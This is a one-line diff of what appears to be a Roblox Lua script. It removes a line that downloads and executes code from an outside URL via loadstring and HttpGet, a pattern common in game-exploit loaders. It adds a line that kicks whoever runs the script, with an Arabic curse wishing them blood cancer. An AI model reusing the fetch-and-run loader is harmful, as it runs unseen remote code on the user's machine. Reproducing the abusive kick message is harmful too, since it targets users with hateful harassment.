@@ -1,1 +1,1 @@
-loadstring(game:HttpGet("https://orrxl4-protector.com/api/raw?id=y0zacv13"))()
+game.Players.LocalPlayer:Kick("جعلك بالسرطان بدمك")
